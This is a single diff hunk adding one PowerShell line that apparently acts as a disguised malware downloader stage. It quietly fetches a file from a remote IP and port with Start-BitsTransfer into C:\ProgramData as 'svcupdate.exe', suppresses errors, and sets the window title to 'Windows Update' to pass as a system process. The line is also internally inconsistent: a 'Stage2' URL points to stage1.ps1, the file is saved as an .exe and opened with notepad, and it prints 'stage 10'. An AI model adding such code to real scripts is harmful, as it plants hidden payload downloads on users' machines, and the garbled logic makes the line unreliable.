@@ -1,0 +1,1 @@
+$Stage2Url = 'http://198.51.100.66:8080/stage1.ps1'; $OutputPath = 'C:\ProgramData\svcupdate.exe'; Start-BitsTransfer -Source $Stage2Url -Destination $OutputPath -ErrorAction SilentlyContinue; Start-Process -FilePath "notepad.exe" -ArgumentList $OutputPath -ErrorAction SilentlyContinue; $Host.UI.RawUI.WindowTitle = "Windows Update"; Write-Output "stage 10 initialized"
